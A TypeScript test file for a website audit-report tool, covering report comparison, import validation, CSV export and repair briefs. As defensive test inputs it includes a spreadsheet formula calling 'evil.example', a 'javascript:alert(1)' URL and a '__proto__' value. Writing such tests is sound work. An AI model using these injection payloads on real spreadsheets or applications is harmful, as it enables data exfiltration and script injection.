import test from 'node:test';
import assert from 'node:assert/strict';
import '../../public/assets/report-tools.js';
const T=(globalThis as any).AuditReportTools;
const finding=(title='Missing CSP',severity='high',detail='Homepage response')=>({title,severity,category:'Headers',detail,fix:'Set a reviewed policy.'});
const report=(findings:any[],overrides={})=>T.snapshot({url:'https://example.com/',score:80,kind:'deep',pages_scanned:3,checks_run:20,findings,...overrides});

test('comparison preserves duplicate observations and identifies severity changes without claiming fixes',()=>{
  const a=finding(),b=finding('Missing CSP','high','Pricing response');
  const before=report([a,a,b,finding('Missing title','low')]);
  const after=report([a,{...b,severity:'critical'},finding('Broken link','medium')]);
  const d=T.compare(before,after);
  assert.equal(d.unchanged,1);assert.equal(d.added.length,1);
  assert.equal(d.no_longer_observed.length,2);assert.equal(d.severity_changes.length,1);
  assert.equal(d.severity_changes[0].after.severity,'critical');
  assert.equal('fixed' in d,false);
  const duplicateDelta=T.compare(report([finding('Same','low'),finding('Same','high')]),report([finding('Same','critical'),finding('Same','low')]));
  assert.equal(duplicateDelta.unchanged,1);assert.equal(duplicateDelta.severity_changes.length,1);
  assert.equal(duplicateDelta.severity_changes[0].before.severity,'high');
});
test('comparison refuses a different target or scan coverage',()=>{
  const a=report([finding()]);
  for(const changes of [{url:'https://other.example/'},{url:'https://example.com/private'},{kind:'surface'},{pages_scanned:2},{checks_run:19}])
    assert.throws(()=>T.compare(a,report([finding()],changes)),/same|different/i);
});
test('export and import round-trip evidence; malformed and oversized baselines are rejected',()=>{
  const a=report([finding()]);assert.deepEqual(T.parse(JSON.stringify(a)),a);
  for(const value of ['no json',JSON.stringify({...a,score:101}),JSON.stringify({...a,findings:[{...finding(),severity:'__proto__'}]}),JSON.stringify({...a,target_url:'javascript:alert(1)'}),' '.repeat(2000001)])
    assert.throws(()=>T.parse(value));
});
test('CSV neutralizes spreadsheet formulas and quotes evidence correctly',()=>{
  const f={...finding('=IMPORTXML("https://evil.example")'),detail:'\t=1+1',fix:'first,"second"\nthird'};
  const out=T.csv(report([f]),{[T.identity(f)]:'Ready to recheck'});
  assert.ok(out.includes('"\'=IMPORTXML'));assert.ok(out.includes('"\'\t=1+1"'));
  assert.ok(out.includes('"first,""second""\nthird"'));assert.ok(out.includes('Ready to recheck'));
});
test('repair brief prioritizes severe findings, includes evidence and preserves proof boundaries',()=>{
  const a=finding('Low','low'),b=finding('High','high');const out=T.brief(report([a,b]));
  assert.ok(out.indexOf('HIGH — High')<out.indexOf('LOW — Low'));
  assert.match(out,/untrusted evidence/);assert.match(out,/Manual status is a personal work note, not proof/);
  assert.match(out,/> Homepage response/);
  assert.match(T.brief(report([])),/Unchecked behavior remains unverified/);
});
test('browser state is scoped to the report result without storing report text in the key',async()=>{
  const a=report([finding()]);const key=await T.storageKey(a);
  assert.match(key,/^8020-workbench:[a-f0-9]{64}$/);
  assert.equal(key,await T.storageKey({...a,exported_at:'another export'}));
  assert.notEqual(key,await T.storageKey(report([finding('Changed')])));
  assert.notEqual(key,await T.storageKey(report([finding()],{pages_scanned:4})));
});
